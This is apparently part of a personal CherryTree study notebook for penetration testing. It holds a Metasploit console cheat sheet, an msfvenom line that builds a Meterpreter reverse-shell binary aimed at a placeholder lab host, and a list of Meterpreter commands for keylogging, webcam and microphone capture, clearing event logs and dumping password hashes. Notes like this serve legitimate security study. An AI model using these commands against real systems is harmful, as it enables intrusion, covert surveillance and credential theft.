			<rich_text foreground="#569cd6">note</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
			<rich_text foreground="#d4d4d4"> 
   </rich_text>
			<rich_text foreground="#808080">&lt;</rich_text>
			<rich_text foreground="#569cd6">to</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
			<rich_text foreground="#d4d4d4">falcon</rich_text>
			<rich_text foreground="#808080">&lt;/</rich_text>
			<rich_text foreground="#569cd6">to</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
			<rich_text>
   </rich_text>
			<rich_text foreground="#808080">&lt;</rich_text>
			<rich_text foreground="#569cd6">from</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
			<rich_text foreground="#d4d4d4">feast</rich_text>
			<rich_text foreground="#808080">&lt;/</rich_text>
			<rich_text foreground="#569cd6">from</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
			<rich_text foreground="#d4d4d4">    </rich_text>
			<rich_text>
   </rich_text>
			<rich_text foreground="#808080">&lt;</rich_text>
			<rich_text foreground="#569cd6">heading</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
			<rich_text foreground="#d4d4d4">hacking</rich_text>
			<rich_text foreground="#808080">&lt;/</rich_text>
			<rich_text foreground="#569cd6">heading</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
			<rich_text foreground="#d4d4d4">    </rich_text>
			<rich_text>
   </rich_text>
			<rich_text foreground="#808080">&lt;</rich_text>
			<rich_text foreground="#569cd6">body</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
			<rich_text foreground="#d4d4d4">XXE attack</rich_text>
			<rich_text foreground="#808080">&lt;/</rich_text>
			<rich_text foreground="#569cd6">body</rich_text>
			<rich_text foreground="#808080">&gt;
 &lt;/</rich_text>
			<rich_text foreground="#569cd6">note</rich_text>
			<rich_text foreground="#808080">&gt;</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="metasploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655727693.85" ts_lastsave="1655729074.42" unique_id="42">
		<rich_text>start postgresql for msfdb
</rich_text>
		<rich_text family="monospace">systemctl start postgresql</rich_text>
		<rich_text>

adding workspace
workspace -a &lt;workspace_name&gt;

more info on workspace
workspace -h

run metasploit
sudo msfconsole -q

run msfdb
sudo msfdb init

for help
help

search for module
search &lt;search_query&gt;

get summary of module
info &lt;module_name&gt;
info &lt;search_id&gt;

using module
use &lt;module_name&gt;
use &lt;search_id&gt;

showing module options
options

setting options
set &lt;options&gt; &lt;value&gt;

showing payloads/aux/options of a module
show &lt;what to show&gt;

search by type
search type:auxiliary telnet

set global value
setg &lt;option&gt; &lt;value&gt;

unset global value
unsetg &lt;option&gt;s

running exploit
exploit
exploit -z (background)

background an exploit
CTRL+Z

interacting with different session
sessions -i &lt;session_id&gt;</rich_text>
		<node custom_icon_id="0" foreground="" is_bold="False" name="msfvenom" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729074.42" ts_lastsave="1655729220.06" unique_id="43">
			<rich_text>show payloads
msfvenom -l payloads

msfvenom common flag
-f format
-e encoding

example
</rich_text>
			<rich_text family="monospace">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</rich_text>
		</node>
		<node custom_icon_id="0" foreground="" is_bold="False" name="meterpreter" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655729174.31" ts_lastsave="1655729843.63" unique_id="44">
			<rich_text>get meterpreter pid
</rich_text>
			<rich_text family="monospace">getpid</rich_text>
			<rich_text>

running process
ps

Core commands
    •         </rich_text>
			<rich_text family="monospace">background</rich_text>
			<rich_text>: Backgrounds the             current session
    •         </rich_text>
			<rich_text family="monospace">exit</rich_text>
			<rich_text>:             Terminate the Meterpreter session
    •         </rich_text>
			<rich_text family="monospace">guid</rich_text>
			<rich_text>:             Get the session GUID (Globally Unique Identifier)

    •         </rich_text>
			<rich_text family="monospace">help</rich_text>
			<rich_text>:             Displays the help menu
    •         </rich_text>
			<rich_text family="monospace">info</rich_text>
			<rich_text>:             Displays information about a Post module
    •         </rich_text>
			<rich_text family="monospace">irb</rich_text>
			<rich_text>:             Opens an interactive Ruby shell on the current session
    •         </rich_text>
			<rich_text family="monospace">load</rich_text>
			<rich_text>:             Loads one or more Meterpreter extensions
    •         </rich_text>
			<rich_text family="monospace">migrate</rich_text>
			<rich_text>: Allows you to             migrate Meterpreter to another process
    •         </rich_text>
			<rich_text family="monospace">run</rich_text>
			<rich_text>:             Executes a Meterpreter script or Post module
    •         </rich_text>
			<rich_text family="monospace">sessions</rich_text>
			<rich_text>: Quickly switch to             another session
File system         commands
    •         </rich_text>
			<rich_text family="monospace">cd</rich_text>
			<rich_text>:             Will change directory
    •         </rich_text>
			<rich_text family="monospace">ls</rich_text>
			<rich_text>:             Will list files in the current directory (dir will also work)
    •         </rich_text>
			<rich_text family="monospace">pwd</rich_text>
			<rich_text>:             Prints the current working directory
    •         </rich_text>
			<rich_text family="monospace">edit</rich_text>
			<rich_text>:             will allow you to edit a file
    •         </rich_text>
			<rich_text family="monospace">cat</rich_text>
			<rich_text>:             Will show the contents of a file to the screen
    •         </rich_text>
			<rich_text family="monospace">rm</rich_text>
			<rich_text>:             Will delete the specified file
    •         </rich_text>
			<rich_text family="monospace">search</rich_text>
			<rich_text>:             Will search for files
    •         </rich_text>
			<rich_text family="monospace">upload</rich_text>
			<rich_text>:             Will upload a file or directory
    •         </rich_text>
			<rich_text family="monospace">download</rich_text>
			<rich_text>: Will download a file             or directory
Networking commands 
    •         </rich_text>
			<rich_text family="monospace">arp</rich_text>
			<rich_text>:             Displays the host ARP (Address Resolution Protocol) cache
    •         </rich_text>
			<rich_text family="monospace">ifconfig</rich_text>
			<rich_text>: Displays network             interfaces available on the target system

    •         </rich_text>
			<rich_text family="monospace">netstat</rich_text>
			<rich_text>: Displays the network             connections
    •         </rich_text>
			<rich_text family="monospace">portfwd</rich_text>
			<rich_text>: Forwards a local             port to a remote service
    •         </rich_text>
			<rich_text family="monospace">route</rich_text>
			<rich_text>:             Allows you to view and modify the routing table
System commands
    •         </rich_text>
			<rich_text family="monospace">clearev</rich_text>
			<rich_text>: Clears the event             logs
    •         </rich_text>
			<rich_text family="monospace">execute</rich_text>
			<rich_text>: Executes a             command
    •         </rich_text>
			<rich_text family="monospace">getpid</rich_text>
			<rich_text>:             Shows the current process identifier
    •         </rich_text>
			<rich_text family="monospace">getuid</rich_text>
			<rich_text>:             Shows the user that Meterpreter is running as
    •         </rich_text>
			<rich_text family="monospace">kill</rich_text>
			<rich_text>:             Terminates a process
    •         </rich_text>
			<rich_text family="monospace">pkill</rich_text>
			<rich_text>:             Terminates processes by name
    •         </rich_text>
			<rich_text family="monospace">ps</rich_text>
			<rich_text>:             Lists running processes
    •         </rich_text>
			<rich_text family="monospace">reboot</rich_text>
			<rich_text>:             Reboots the remote computer
    •         </rich_text>
			<rich_text family="monospace">shell</rich_text>
			<rich_text>:             Drops into a system command shell
    •         </rich_text>
			<rich_text family="monospace">shutdown</rich_text>
			<rich_text>: Shuts down the             remote computer
    •         </rich_text>
			<rich_text family="monospace">sysinfo</rich_text>
			<rich_text>: Gets information             about the remote system, such as OS
Others Commands (these         will be listed under different menu categories in the help menu)
    •         </rich_text>
			<rich_text family="monospace">idletime</rich_text>
			<rich_text>: Returns the number             of seconds the remote user has been idle
    •         </rich_text>
			<rich_text family="monospace">keyscan_dump</rich_text>
			<rich_text>: Dumps the keystroke             buffer
    •         </rich_text>
			<rich_text family="monospace">keyscan_start</rich_text>
			<rich_text>: Starts capturing             keystrokes
    •         </rich_text>
			<rich_text family="monospace">keyscan_stop</rich_text>
			<rich_text>: Stops capturing             keystrokes
    •         </rich_text>
			<rich_text family="monospace">screenshare</rich_text>
			<rich_text>: Allows you to watch             the remote user's desktop in real time
    •         </rich_text>
			<rich_text family="monospace">screenshot</rich_text>
			<rich_text>: Grabs a screenshot             of the interactive desktop
    •         </rich_text>
			<rich_text family="monospace">record_mic</rich_text>
			<rich_text>: Records audio from             the default microphone for X seconds
    •         </rich_text>
			<rich_text family="monospace">webcam_chat</rich_text>
			<rich_text>: Starts a video             chat
    •         </rich_text>
			<rich_text family="monospace">webcam_list</rich_text>
			<rich_text>: Lists webcams    
    •         </rich_text>
			<rich_text family="monospace">webcam_snap</rich_text>
			<rich_text>: Takes a snapshot             from the specified webcam
    •         </rich_text>
			<rich_text family="monospace">webcam_stream</rich_text>
			<rich_text>: Plays a video stream             from the specified webcam
    •         </rich_text>
			<rich_text family="monospace">getsystem</rich_text>
			<rich_text>: Attempts to elevate             your privilege to that of local system
    •         </rich_text>
			<rich_text family="monospace">hashdump</rich_text>
			<rich_text>: Dumps the contents             of the SAM database


loading python into meterpreter
load python

loading kiwi into meterpreter
load kiwi
</rich_text>
		</node>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="lab_ideas" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394224.89" ts_lastsave="1655397167.66" unique_id="20">
		<rich_text></rich_text>
	</node>
	<node custom_icon_id="0" foreground="" is_bold="False" name="general_items" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395204.23" ts_lastsave="1655395274.29" unique_id="35">
		<rich_text foreground="#d4d4d4">pipelining:</rich_text>
		<rich_text>
</rich_text>
		<rich_text foreground="#dcdcaa">echo</rich_text>
		<rich_text foreground="#d4d4d4"> </rich_text>
		<rich_text foreground="#ce9178">&quot;create file&quot;</rich_text>
		<rich_text foreground="#d4d4d4"> &gt; &lt;filename&gt;</rich_text>
		<rich_text>
</rich_text>
		<rich_text foreground="#dcdcaa">echo</rich_text>
		<rich_text foreground="#d4d4d4"> </rich_text>
		<rich_text foreground="#ce9178">&quot;append text&quot;</rich_text>
		<rich_text foreground="#d4d4d4"> &gt;&gt; &lt;filename&gt;</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">check current user
whoami</rich_text>
		<rich_text>

</rich_text>
		<rich_text foreground="#d4d4d4">check current directory </rich_text>
		<rich_text>
</rich_text>
		<rich_text foreground="#dcdcaa">pwd</rich_text>
	</node>
</cherrytree>
